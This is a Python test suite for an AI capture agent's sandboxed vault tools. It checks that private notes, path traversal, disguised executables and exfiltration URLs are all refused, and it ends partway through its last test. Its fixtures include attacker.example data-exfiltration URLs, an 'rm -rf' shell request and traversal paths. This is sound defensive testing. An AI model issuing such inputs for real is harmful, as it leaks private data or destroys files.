"""Opt-in capture agent: durable requests, bounded launch and observable completion.

The tests use real temporary cards and job files, but no model, desktop notification,
network request or agent CLI is started. Most process/Win32 boundaries are stand-ins;
dedicated tests launch two real POSIX workers and, on Windows, check native argv/aliases.
Run from the repository root: python -m unittest discover -s tests -p v3_yakala_ajan_test.py -v
"""


import base64


import contextlib


import ctypes as C


import hashlib


import io


import json


import os


from pathlib import Path


import subprocess


import socket


import sys


import tempfile


import threading


import time


import types


import unittest


from unittest import mock


from unittest.mock import Mock, patch


import uuid


ROOT = Path(__file__).resolve().parents[1]


SCRIPTS = ROOT / 'template/.claude/scripts'


sys.path.insert(0, str(SCRIPTS))


import beyin_v3_yakala as yakala  # noqa: E402


def _host_lock_for_simulated_linux():
    """The popup is simulated as Linux; on a Windows host flock is missing, so a plain lock stands in."""
    if os.name != 'nt':
        return contextlib.nullcontext()
    locks, guard = {}, threading.Lock()

    class HostLock:
        def __init__(self, path):
            with guard:
                self.lock = locks.setdefault(str(path), threading.RLock())

        def __enter__(self):
            self.lock.acquire()
            return self

        def __exit__(self, *_):
            self.lock.release()

    enqueue = yakala.enqueue_agent

    def host_enqueue(*args, **kwargs):
        # Queue files are host files: a simulated Linux would fsync directories Windows refuses to open.
        with patch.object(yakala, 'os', os), patch.object(yakala, 'sys', sys):
            return enqueue(*args, **kwargs)
    stack = contextlib.ExitStack()
    stack.enter_context(patch.object(yakala, '_AgentFileLock', HostLock))
    stack.enter_context(patch.object(yakala, 'enqueue_agent', host_enqueue))
    return stack


class AgentBridgeFilesTest(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix='yakala-agent-bridge-')
        self.addCleanup(temporary.cleanup)
        base = Path(temporary.name).resolve()  # the bridge is started with a resolved vault and state
        self.vault, self.state = base / 'Örnek Vault', base / 'state'
        self.vault.mkdir()
        self.state.mkdir()
        result = yakala.capture(self.vault, url='https://example.com/music', why='Find the music', state=self.state)
        self.job = {'id': str(uuid.uuid4()), 'card_id': result['id'], 'card_path': result['path'],
                    'request': 'Find the music', 'url': 'https://example.com/music', 'client': 'claude',
                    'session_id': str(uuid.uuid4()), 'state': 'running', 'worker_pid': os.getpid(),
                    'worker_identity': yakala._agent_process_identity(os.getpid()),
                    'runtime_deadline_ns': time.monotonic_ns() + 900 * 1000000000}
        self.job_folder = self.state / 'yakala' / 'ajan' / self.job['id']
        self.job_folder.mkdir(parents=True)
        for name, value in (('_agent_job_dir', lambda vault, state, job_id: self.job_folder),
                            ('_agent_load_job', lambda vault, state, job_id: dict(self.job))):
            mocked = patch.object(yakala, name, value, create=True)
            mocked.start()
            self.addCleanup(mocked.stop)

    def call(self, name, **arguments):
        return yakala._agent_tool_call(self.vault, self.state, self.job['id'], name, arguments)

    def note(self, path, content='Example text'):
        target = self.vault / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding='utf-8', newline='')  # keep the given line endings on Windows too
        return target

    def transfer(self, body=b'ID3\x04\0\0\0\0\0\0a test track'):
        def fetch(url, byte_limit, output):
            self.assertEqual(byte_limit, 50 * 1024 * 1024)
            output.write(body)
            return {'url': url, 'body': None, 'bytes': len(body), 'content_type': 'audio/mpeg',
                    'sha256': hashlib.sha256(body).hexdigest()}
        return patch.object(yakala, '_agent_public_get', side_effect=fetch)

    def authorize_links(self, *urls):
        import html
        body = ('<html>' + ''.join('<a href="' + html.escape(url, quote=True) + '">source</a>'
                                 for url in urls) + '</html>').encode('utf-8')
        with patch.object(yakala, '_agent_public_get', return_value={
                'url': self.job['url'], 'body': body, 'content_type': 'text/html; charset=utf-8'}):
            return self.call('fetch_source', url=self.job['url'])

    def test_visible_notes_and_exact_control_files_are_available(self):
        for path in ('knowledge/concept.md', 'AGENTS.md', 'CLAUDE.md',
                     '.agents/skills/beyin-yakala/SKILL.md', '.claude/skills/beyin-yakala/SKILL.md'):
            self.note(path)
            self.assertEqual(self.call('read_note', path=path)['text'], 'Example text')

    def test_only_a_running_job_can_use_its_capabilities(self):
        self.note('knowledge/allowed.md')
        with patch.object(yakala, '_agent_read_note') as read:
            for state in ('preparing', 'queued', 'completed', 'failed', 'approval_required'):
                self.job['state'] = state
                with self.subTest(state=state), self.assertRaises(ValueError):
                    self.call('read_note', path='knowledge/allowed.md')
            read.assert_not_called()

    def test_hidden_secrets_binary_absolute_traversal_and_devices_are_refused(self):
        for path in ('.claude/settings.json', '.env', 'credentials.md', 'secrets/a.md', 'kasa/b.md',
                     '../outside.md', 'C:/Users/a.md', '//server/share/a.md', r'..\outside.md',
                     'NUL.md', 'note.md:stream', 'knowledge/note.md.', 'picture.png'):
            with self.subTest(path=path), self.assertRaises((OSError, ValueError)):
                self.call('read_note', path=path)

    def test_note_link_and_directory_link_are_not_followed(self):
        ordinary = self.note('ordinary.md', 'ordinary')
        linked = self.vault / 'link.md'
        try:
            linked.symlink_to(ordinary)
        except OSError as exc:
            self.skipTest('Symlink creation is not permitted: ' + str(exc))
        with self.assertRaises(ValueError):
            self.call('read_note', path='link.md')
        (self.vault / 'linked').symlink_to(self.vault, target_is_directory=True)
        with self.assertRaises(ValueError):
            self.call('read_note', path='linked/ordinary.md')

    def test_only_current_raw_and_explicitly_attached_text_are_available(self):
        parent = Path(self.job['card_path']).parent
        raw = (parent / '.ham' / (self.job['card_id'] + '.md')).as_posix()
        other = (parent / '.ham' / 'other.md').as_posix()
        self.note(raw, 'Current captured text')
        self.note(other, 'Other captured text')
        self.assertEqual(self.call('read_note', path=raw)['text'], 'Current captured text')
        with self.assertRaises(ValueError):
            self.call('read_note', path=other)
        attached, unrelated = (parent / 'dosyalar' / 'attached.txt').as_posix(), (parent / 'dosyalar' / 'other.txt').as_posix()
        self.note(attached)
        self.note(unrelated)
        card = self.vault / self.job['card_path']
        card.write_text(card.read_text(encoding='utf-8') + '\n## Dosyalar\n\n- [[' + attached + ']]\n', encoding='utf-8')
        self.assertEqual(self.call('read_note', path=attached)['text'], 'Example text')
        with self.assertRaises(ValueError):
            self.call('read_note', path=unrelated)

    def test_sensitive_source_card_name_is_readable_only_for_its_job(self):
        canary = 'source-filename-canary'
        for word in ('gizli', 'sifre', 'password'):
            own = yakala.capture(self.vault, text=canary, title=word + ' kaynak', state=self.state)
            self.job.update(card_id=own['id'], card_path=own['path'])
            with self.subTest(word=word):
                self.assertTrue(yakala._agent_private_name(Path(own['path']).name))
                self.assertIn(canary, self.call('read_note', path=own['path'])['text'])
                self.assertEqual(self.call('search_notes', query=canary)['matches'], [])
                self.job.update(card_path='another-card.md')
                with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=own['path'])

    def test_other_sensitive_notes_and_cards_remain_unavailable(self):
        other = yakala.capture(self.vault, url='https://example.com/other', title='gizli kart', state=self.state)
        for path in ('knowledge/gizli.md', other['path']):
            with self.subTest(path=path):
                if path != other['path']:
                    self.note(path)
                with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)

    def test_sensitive_source_raw_and_only_linked_attachment_are_readable(self):
        own = yakala.capture(self.vault, text='Source text', title='gizli kaynak', state=self.state)
        self.job.update(card_id=own['id'], card_path=own['path'])
        parent = Path(own['path']).parent
        raw = (parent / yakala.RAW / (own['id'] + '.md')).as_posix()
        attached = (parent / yakala.FILES / 'gizli-ek.txt').as_posix()
        unrelated = (parent / yakala.FILES / 'gizli-diger.txt').as_posix()
        other_raw = (parent / yakala.RAW / 'gizli-diger.md').as_posix()
        for path in (raw, attached, unrelated, other_raw):
            self.note(path, '---\nvisibility: private\n---\nSource file text')
        card = self.vault / own['path']
        card.write_text(card.read_text(encoding='utf-8') + '\n- [[' + attached + ']]\n', encoding='utf-8')
        for path in (raw, attached):
            with self.subTest(path=path):
                self.assertIn('Source file text', self.call('read_note', path=path)['text'])
        for path in (unrelated, other_raw):
            with self.subTest(path=path), self.assertRaises(ValueError):
                self.call('read_note', path=path)

    def test_source_filename_exception_preserves_hidden_and_sensitive_directories(self):
        for folder in ('.hidden', 'gizli'):
            self.job.update(card_id='gizli-kart', card_path=folder + '/gizli-kart.md')
            paths = (self.job['card_path'], folder + '/' + yakala.RAW + '/gizli-kart.md',
                     folder + '/' + yakala.FILES + '/gizli-ek.txt')
            for path in paths:
                self.note(path)
                with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)
        self.job.update(card_path='knowledge/.gizli.md')
        self.note(self.job['card_path'])
        with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
            self.call('read_note', path=self.job['card_path'])

    def test_source_filename_exception_preserves_explicit_metadata_bans(self):
        self.job.update(card_id='gizli-kart', card_path='knowledge/gizli-kart.md')
        raw = 'knowledge/' + yakala.RAW + '/gizli-kart.md'
        attached = 'knowledge/' + yakala.FILES + '/gizli-ek.txt'
        for field in ('remote_allowed: false', 'sensitivity: sensitive', 'kaynak_guveni: blocked'):
            header = '---\n' + field + '\n---\n'
            self.note(self.job['card_path'], header + '[[' + attached + ']]')
            self.note(raw)
            self.note(attached)
            for path in (self.job['card_path'], raw, attached):
                with self.subTest(field=field, path=path), self.assertRaisesRegex(ValueError, 'frontmatter forbids'):
                    self.call('read_note', path=path)

    def test_case_and_short_aliases_cannot_impersonate_the_source_card(self):
        own = 'knowledge/gizli-kart.md'
        foreign = self.note('knowledge/gizli-diger.md', 'FOREIGN_CARD_CANARY')
        self.job.update(card_path=own)
        original = yakala._agent_checked_path

        def alias_lookup(root, parts, create=False):
            if '/'.join(parts) in (own, own.upper(), 'knowledge/GIZLIK~1.MD', 'knowledge/ordinary.md'):
                return foreign
            return original(root, parts, create=create)

        # Simulate aliases on every host, including an exact spelling with a foreign canonical target.
        with patch.object(yakala, '_agent_checked_path', side_effect=alias_lookup):
            for path in (own, own.upper(), 'knowledge/GIZLIK~1.MD', 'knowledge/ordinary.md'):
                with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)

    def test_note_reads_are_bounded_and_reject_binary(self):
        self.note('large.md', 'x' * (200 * 1024 + 1))
        self.note('binary.md', 'first\0second')
        for path in ('large.md', 'binary.md'):
            with self.assertRaises(ValueError):
                self.call('read_note', path=path)

    def test_explicit_remote_ban_sensitive_and_blocked_metadata_are_honored(self):
        for index, field in enumerate(('remote_allowed: false', 'remote_allowed: "false"',
                                       'remote_allowed: false # local only', 'remote_allowed: "false" # local only',
                                       'remote_allowed: \n  false',
                                       'sensitivity: sensitive', 'kaynak_guveni: blocked')):
            path = 'knowledge/item-%d.md' % index
            self.note(path, '---\n' + field + '\n---\nneedle that must remain local')
            with self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query='needle')['matches'], [])
        self.note('ordinary.md', '---\nvisibility: internal\n---\nordinary authorized internal note')
        self.assertIn('ordinary authorized', self.call('read_note', path='ordinary.md')['text'])

    def test_json_and_quoted_yaml_privacy_flags_control_both_reading_and_search(self):
        canary = 'metadata-permission-canary'
        cases = (
            ('json-false', '{"remote_allowed":false}', False),
            ('json-true', '{"remote_allowed":true,"visibility":"internal"}', True),
            ('json-true-private', '{"remote_allowed":true,"visibility":"private"}', False),
            ('json-sensitive', '{"remote_allowed":true,"sensitivity":"sensitive"}', False),
            ('json-escaped-key-false', r'{"remote\u005fallowed":false}', False),
            ('json-escaped-key-true', r'{"remote\u005fallowed":true}', True),
            ('json-escaped-value', r'{"sensitivity":"sensi\u0074ive","remote_allowed":true}', False),
            ('json-pretty', '{\n  "remote_allowed": true,\n  "visibility": "internal"\n}', True),
            ('yaml-double-quoted-key', '"remote_allowed": false', False),
            ('yaml-single-quoted-key', "'remote_allowed': false", False),
            ('yaml-quoted-key-true', '"remote_allowed": true\nvisibility: internal', True),
            ('yaml-true-private', '"remote_allowed": true\nvisibility: private', False),
            ('yaml-quoted-blocked', '"kaynak_guveni": blocked', False),
        )
        expected = []
        for index, (label, header, allowed) in enumerate(cases):
            path = 'knowledge/guard-%02d.md' % index
            self.note(path, '---\n' + header + '\n---\n' + canary)
            with self.subTest(case=label):
                if allowed:
                    self.assertIn(canary, self.call('read_note', path=path)['text'])
                    expected.append(path)
                else:
                    with self.assertRaises(ValueError):
                        self.call('read_note', path=path)
        matches = self.call('search_notes', query=canary)['matches']
        self.assertEqual(sorted(item['path'] for item in matches), sorted(expected))

    def test_ambiguous_or_malformed_metadata_is_never_returned_as_plain_note_text(self):
        canary = 'rejected-metadata-canary'
        cases = (
            ('json-duplicate', '{"remote_allowed":false,"remote_allowed":true}', True),
            ('json-escaped-duplicate', r'{"remote_allowed":false,"remote\u005fallowed":true}', True),
            ('json-malformed', '{"remote_allowed" true}', True),
            ('json-trailing-comma', '{"remote_allowed":true,}', True),
            ('json-array', '[{"remote_allowed":false}]', True),
            ('json-string', '"remote_allowed"', True),
            ('yaml-duplicate', 'remote_allowed: false\nremote_allowed: true', True),
            ('yaml-quoted-duplicate', '"remote_allowed": false\nremote_allowed: true', True),
            ('yaml-malformed', 'remote_allowed true', True),
            ('json-unclosed-frontmatter', '{"remote_allowed":false}', False),
            ('yaml-unclosed-frontmatter', 'remote_allowed: false', False),
        )
        for index, (label, header, closed) in enumerate(cases):
            path = 'knowledge/invalid-%02d.md' % index
            self.note(path, '---\n' + header + '\n' + ('---\n' if closed else '') + canary)
            with self.subTest(case=label), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])

    def test_source_card_remote_ban_also_protects_its_raw_text(self):
        card = self.vault / self.job['card_path']
        meta, body = yakala.read_card(card)
        meta['remote_allowed'] = False
        yakala.write_card(card, meta, body)
        raw = (Path(self.job['card_path']).parent / '.ham' / (self.job['card_id'] + '.md')).as_posix()
        self.note(raw, 'private raw source')
        with self.assertRaises(ValueError):
            self.call('read_note', path=raw)

    def test_private_notes_stay_out_except_this_jobs_own_card_raw_and_results(self):
        # Hook context never shows `visibility: private` (audience "internal"); neither may a job
        # that also has public fetch and web search. Its own card and outputs stay readable.
        # Names carry no kasa-class word, so only the visibility gate can refuse these. Quoted and
        # commented forms included: capture's own _dump writes `visibility: "private"`.
        canary = 'gunluk-izi-canary'
        headers = {'plain': 'visibility: private', 'double': 'visibility: "private"',
                   'single': "visibility: 'private'", 'comment': 'visibility: private # yalniz yerel',
                   'json': '{"visibility": "private"}'}
        paths = []
        for name, header in headers.items():
            paths.append('knowledge/gunluk-%s.md' % name)
            self.note(paths[-1], '---\n' + header + '\n---\n' + canary)
        other = yakala.capture(self.vault, text='Alisveris listesi ' + canary, why='Baska is', state=self.state)
        self.assertIn('visibility: "private"', (self.vault / other['path']).read_text(encoding='utf-8'))
        for path in paths + [other['path']]:
            with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'visibility: private'):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])
        own = yakala.capture(self.vault, text='Bu isin pano metni', why='Ozetle', state=self.state)
        self.assertEqual(yakala.find_card(self.vault, own['id'], self.state)['meta']['visibility'], 'private')
        self.job.update(card_id=own['id'], card_path=own['path'], url='')
        self.assertIn('Bu isin pano metni', self.call('read_note', path=own['path'])['text'])
        raw = (Path(own['path']).parent / '.ham' / (own['id'] + '.md')).as_posix()
        self.note(raw, '---\nvisibility: private\n---\nham metin')
        self.assertIn('ham metin', self.call('read_note', path=raw)['text'])
        result = self.call('write_note', title='Ozet', content='Sonuc metni')
        self.assertIn('Sonuc metni', self.call('read_note', path=result['path'])['text'])

    def test_search_excludes_hidden_sensitive_and_attachment_folders(self):
        self.note('.cache/needle.md', 'needle')
        self.note('passwords/needle.md', 'needle')
        self.note((Path(self.job['card_path']).parent / 'dosyalar/needle.md').as_posix(), 'needle')
        self.note('knowledge/needle.md', 'needle')
        result = self.call('search_notes', query='needle')
        self.assertEqual([item['path'] for item in result['matches']], ['knowledge/needle.md'])

    def test_search_has_a_thirty_result_limit(self):
        for index in range(34):
            self.note('knowledge/item-%02d.md' % index, 'distinctive marker')
        result = self.call('search_notes', query='distinctive')
        self.assertEqual(len(result['matches']), 30)
        self.assertTrue(result['truncated'])

    def test_write_note_is_additive_owned_and_does_not_overwrite(self):
        result = self.call('write_note', title='Found music', content='Track title with its source URL.')
        path = self.vault / result['path']
        before = path.read_bytes()
        meta, _body = yakala.read_card(path)
        self.assertEqual(meta['ajan_isi'], self.job['id'])
        self.assertEqual(meta['kaynak_karti'], self.job['card_path'])
        self.assertEqual(meta['visibility'], 'private')
        with self.assertRaises(FileExistsError):
            self.call('write_note', title='Found music', content='Erase the original')
        self.assertEqual(path.read_bytes(), before)

    def test_write_note_rejects_device_names_binary_and_large_content(self):
        for title, content in (('CON', 'x'), ('normal', 'x\0y'), ('normal', 'x' * (200 * 1024 + 1))):
            with self.assertRaises(ValueError):
                self.call('write_note', title=title, content=content)

    def test_download_stages_valid_data_records_hash_and_refuses_overwrite(self):
        self.authorize_links('https://example.com/track.mp3')
        with self.transfer():
            result = self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
            with self.assertRaises(FileExistsError):
                self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
        stored = self.job_folder / 'downloads' / result['staging_path']
        self.assertEqual(result['sha256'], hashlib.sha256(stored.read_bytes()).hexdigest())
        registered = json.loads((self.job_folder / 'download-manifests/track.mp3.json').read_text(encoding='utf-8'))
        self.assertEqual(registered, result)

    def test_download_refuses_executables_names_and_disguised_binary(self):
        self.authorize_links('https://example.com/a')
        with patch.object(yakala, '_agent_public_get') as fetch:
            for name in ('x.exe', 'x.py', '../x.mp3', 'NUL.txt', 'x.mp3:evil', 'x.mp3.cmd'):
                with self.assertRaises(ValueError):
                    self.call('download', url='https://example.com/a', filename=name)
            fetch.assert_not_called()
        with self.transfer(b'MZ malicious executable'):
            with self.assertRaises(ValueError):
                self.call('download', url='https://example.com/a', filename='song.mp3')
        self.assertFalse((self.job_folder / 'downloads/song.mp3').exists())

    def test_complete_records_owned_outputs_and_is_idempotent(self):
        self.authorize_links('https://example.com/a.mp3')
        note = self.call('write_note', title='Result', content='Verified result')
        with self.transfer():
            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
        arguments = {'status': 'completed', 'summary': 'Saved the file.', 'notes': [note['path']], 'downloads': [download]}
        self.assertEqual(self.call('complete', **arguments), self.call('complete', **arguments))
        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
        self.assertEqual(manifest['job_id'], self.job['id'])
        self.assertEqual(manifest['notes'], [note['path']])
        self.assertEqual(manifest['downloads'], [download])
        with self.assertRaises(ValueError):
            self.call('complete', status='failed', summary='Changed my mind')
        with self.assertRaises(ValueError):
            self.call('write_note', title='Late mutation', content='no')

    def test_complete_auto_notes_remain_idempotent_after_worker_writes_its_host_result(self):
        note = self.call('write_note', title='Result', content='Agent-produced result.')
        arguments = {'status': 'completed', 'summary': 'Submitted result.'}
        before = self.call('complete', **arguments)
        note_root = (self.vault / note['path']).parent
        (note_root / '__host-result.md').write_text(yakala._dump(
            {'tur': 'yakala-ajan-sonucu', 'ajan_isi': self.job['id'], 'visibility': 'private'},
            '# Trusted worker result'), encoding='utf-8')
        self.assertEqual(self.call('complete', **arguments), before)
        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
        self.assertEqual(manifest['notes'], [note['path']])

    def test_complete_refuses_foreign_note_and_forged_download(self):
        self.authorize_links('https://example.com/a.mp3')
        self.note('knowledge/existing.md')
        with self.assertRaises(ValueError):
            self.call('complete', status='completed', summary='result', notes=['knowledge/existing.md'])
        with self.transfer():
            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
        for bad in ({**download, 'sha256': '0' * 64}, {**download, 'staging_path': '../song.mp3'}):
            with self.assertRaises(ValueError):
                self.call('complete', status='completed', summary='result', downloads=[bad])
        self.assertFalse((self.job_folder / 'result.json').exists())

    def test_yaml_privacy_syntax_cannot_be_downgraded_to_an_unknown_plain_scalar(self):
        canary = 'privacy-syntax-canary'
        headers = (
            'sensitivity: GİZLİ',
            'SENSİTİVİTY: secret',
            'sensitivity: !!str secret',
            'sensitivity: &privacy secret',
            r'sensitivity: "\x73ecret"',
            r'"\x72emote_allowed": false',
            'sensitivity:\n  - secret',
            'sensitivity: [secret]',
            'sensitivity: null',
            'title: ordinary\n---extra: valid-yaml-key\nremote_allowed: false',
        )
        for index, front in enumerate(headers):
            path = 'knowledge/syntax-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\n' + canary)
            with self.subTest(header=front), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])

    def test_obsidian_list_properties_stay_readable_but_never_carry_a_policy_value(self):
        # Obsidian writes list properties as indented `- item` blocks; most vault notes have them.
        readable = ('tags:\n  - proje\n  - fikir\naliases:\n  - Plan',
                    'tags:\n- proje\nremote_allowed: true')
        for index, front in enumerate(readable):
            path = 'knowledge/liste-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\nlist property text')
            with self.subTest(header=front):
                self.assertIn('list property text', self.call('read_note', path=path)['text'])
        refused = ('tags:\n  - proje\nsensitivity: secret', 'sensitivity:\n  - secret',
                   'sensitivity: internal\n  - secret', 'remote_allowed:\n  - true\n  - false')
        for index, front in enumerate(refused):
            path = 'knowledge/liste-yasak-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\nlist policy canary')
            with self.subTest(header=front), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query='list policy canary')['matches'], [])

    def test_simple_allowed_yaml_and_json_values_keep_working_with_crlf(self):
        headers = (
            'remote_allowed: true\nsensitivity: ordinary # safe',
            '"remote_allowed": "true" # explicit\nsensitivity: "ordinary"',
            "'remote_allowed': 'true'\ntags: [\"one\", \"two\"]",
            '{"remote_allowed": true, "sensitivity": "ordinary"}',
        )
        for index, front in enumerate(headers):
            path = 'knowledge/ordinary-%02d.md' % index
            self.note(path, ('---\n' + front + '\n---\nallowed scalar text').replace('\n', '\r\n'))
            with self.subTest(header=front):
                self.assertIn('allowed scalar text', self.call('read_note', path=path)['text'])

    def test_case_alias_of_attachment_store_still_requires_this_cards_link(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
        original = yakala._agent_checked_path

        def case_insensitive_lookup(root, parts, create=False):
            return original(root, [yakala.FILES if part.casefold() == yakala.FILES else part for part in parts],
                            create=create)

        # Exercise the Windows/macOS lookup rule on all hosts; native integration is below.
        with patch.object(yakala, '_agent_checked_path', side_effect=case_insensitive_lookup):
            with self.assertRaises(ValueError):
                self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())

    def test_search_never_walks_case_variants_of_actual_attachment_store(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / 'DOSYALAR' / 'foreign.md').as_posix(), 'ATTACHMENT_SEARCH_CANARY')
        self.assertEqual(self.call('search_notes', query='ATTACHMENT_SEARCH_CANARY')['matches'], [])

    def test_canonical_long_name_is_checked_after_an_alias_lookup(self):
        self.note('.hidden/ordinary.md', 'HIDDEN_ALIAS_CANARY')
        original = yakala._agent_checked_path

        def short_name_lookup(root, parts, create=False):
            if parts == ['HIDDEN~1', 'ordinary.md']:
                return original(root, ['.hidden', 'ordinary.md'], create=create)
            return original(root, parts, create=create)

        with patch.object(yakala, '_agent_checked_path', side_effect=short_name_lookup):
            with self.assertRaises(ValueError):
                self.call('read_note', path='HIDDEN~1/ordinary.md')

    @unittest.skipUnless(os.name == 'nt' and sys.platform == 'win32', 'Native Windows path aliases')
    def test_native_windows_attachment_case_and_short_hidden_alias(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
        with self.assertRaises(ValueError):
            self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())
        hidden = self.note('.hidden-directory/ordinary.md', 'HIDDEN_ALIAS_CANARY').parent
        kernel = C.WinDLL('kernel32', use_last_error=True)
        convert = kernel.GetShortPathNameW
        convert.argtypes = (C.c_wchar_p, C.c_wchar_p, C.c_uint32)
        convert.restype = C.c_uint32
        buffer = C.create_unicode_buffer(32768)
        length = convert(str(hidden), buffer, len(buffer))
        if not length or length >= len(buffer):
            self.skipTest('8.3 short names are unavailable on this filesystem.')
        alias = Path(buffer.value).name
        if alias.startswith('.') or alias.casefold() == hidden.name.casefold():
            self.skipTest('The filesystem did not assign an alternate 8.3 name.')
        with self.assertRaises(ValueError):
            self.call('read_note', path=alias + '/ordinary.md')

    def test_arbitrary_public_url_cannot_transmit_vault_text(self):
        self.note('knowledge/ordinary.md', 'VAULT_CANARY_7291')
        canary = self.call('read_note', path='knowledge/ordinary.md')['text']
        malicious = (
            'https://attacker.example/collect?text=' + canary,
            'https://' + canary.lower() + '.attacker.example/',
            self.job['url'] + '?text=' + canary,
            self.job['url'] + '/' + canary,
        )
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for url in malicious:
                for tool, extra in (('fetch_source', {}), ('download', {'filename': 'payload.txt'})):
                    with self.subTest(url=url, tool=tool), self.assertRaises(ValueError):
                        self.call(tool, url=url, **extra)
            fetched.assert_not_called()

    def test_exact_source_links_can_be_downloaded_but_modifying_them_is_denied(self):
        url = 'https://cdn.example.com/track.mp3?version=1'
        source = self.authorize_links(url)
        self.assertIn(url, source['links'])
        with self.transfer():
            result = self.call('download', url=url, filename='permitted.mp3')
        self.assertEqual(result['source_url'], url)
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for changed in (url + '&private=CANARY', url.replace('version=1', 'version=2'),
                            url.replace('cdn.example.com', 'attacker.example')):
                with self.subTest(url=changed), self.assertRaises(ValueError):
                    self.call('fetch_source', url=changed)
            fetched.assert_not_called()

    def test_successful_complete_revokes_reads_search_and_fetch_immediately(self):
        self.note('knowledge/ordinary.md', 'ordinary')
        result = {'status': 'completed', 'summary': 'Done.'}
        self.call('complete', **result)
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for tool, args in (('read_note', {'path': 'knowledge/ordinary.md'}),
                               ('search_notes', {'query': 'ordinary'}),
                               ('fetch_source', {'url': self.job['url']})):
                with self.subTest(tool=tool), self.assertRaises(ValueError):
                    self.call(tool, **args)
            fetched.assert_not_called()
        self.assertTrue(self.call('complete', **result)['accepted'])

    def test_complete_acknowledges_submission_without_claiming_worker_success(self):
        result = self.call('complete', status='completed', summary='Model considers its work done.')
        self.assertTrue(result['accepted'])
        self.assertEqual(result['status'], 'submitted')
        self.assertEqual(result['requested_status'], 'completed')
        self.assertFalse(result['completion_verified'])
        self.assertEqual(self.job['state'], 'running')

    def test_completion_manifest_is_invisible_until_its_snapshot_is_durable(self):
        target = self.job_folder / 'result.json'
        original = yakala.os.fsync
        snapshots = []

        def inspect_before_commit(descriptor):
            snapshots.append(target.exists())
            return original(descriptor)

        with patch.object(yakala.os, 'fsync', side_effect=inspect_before_commit):
            self.call('complete', status='completed', summary='Durable result.')
        # The first fsync belongs to private staged content. A later directory fsync may see the commit.
        self.assertFalse(snapshots[0])
        self.assertEqual(json.loads(target.read_text(encoding='utf-8'))['summary'], 'Durable result.')
        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])

    def test_failed_atomic_completion_publication_leaves_no_partial_manifest(self):
        target = self.job_folder / 'result.json'
        with patch.object(yakala.os, 'link', side_effect=OSError('filesystem has no atomic create-only link')):
            with self.assertRaises(OSError):
                self.call('complete', status='completed', summary='Must not appear early.')
        self.assertFalse(target.exists())
        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])

    def protocol(self, messages):
        lines = '\n'.join(json.dumps(item) for item in messages) + '\n'
        outgoing = io.StringIO()
        with patch.object(sys, 'stdin', io.StringIO(lines)), patch.object(sys, 'stdout', outgoing):
            code = yakala._agent_mcp_main(self.vault, self.state, self.job['id'])
        return code, [json.loads(line) for line in outgoing.getvalue().splitlines()]

    def handshake(self, version='2025-06-18'):
        return [{'jsonrpc': '2.0', 'id': 1, 'method': 'initialize', 'params': {'protocolVersion': version}},
                {'jsonrpc': '2.0', 'method': 'notifications/initialized'}]

    def test_protocol_initialize_tools_and_ping_are_only_json(self):
        code, rows = self.protocol(self.handshake() + [
            {'jsonrpc': '2.0', 'id': 2, 'method': 'tools/list'},
            {'jsonrpc': '2.0', 'id': 3, 'method': 'ping'},
        ])
        self.assertEqual(code, 0)
        self.assertEqual(len(rows), 3)
        self.assertEqual(rows[0]['result']['protocolVersion'], '2025-06-18')
        names = [tool['name'] for tool in rows[1]['result']['tools']]
        self.assertEqual(names, ['read_note', 'search_notes', 'fetch_source', 'download', 'write_note', 'complete'])
        self.assertEqual(rows[2]['result'], {})

    def test_protocol_refuses_uninitialized_unknown_method_and_bad_tool(self):
        code, rows = self.protocol([
            {'jsonrpc': '2.0', 'id': 0, 'method': 'tools/list'},
            *self.handshake(),
            {'jsonrpc': '2.0', 'id': 2, 'method': 'shell/execute', 'params': {'command': 'rm -rf'}},
            {'jsonrpc': '2.0', 'id': 3, 'method': 'tools/call', 'params': {'name': []}},
        ])
        self.assertEqual(code, 0)
        self.assertEqual([row.get('error', {}).get('code') for row in rows], [-32002, None, -32601, -32602])

    def test_protocol_tool_error_is_result_and_never_invokes_shell(self):
        with patch.object(yakala.subprocess, 'Popen') as spawned:
            code, rows = self.protocol(self.handshake() + [
                {'jsonrpc': '2.0', 'id': 2, 'method': 'tools/call',
                 'params': {'name': 'read_note', 'arguments': {'path': '../secrets.md'}}},
            ])
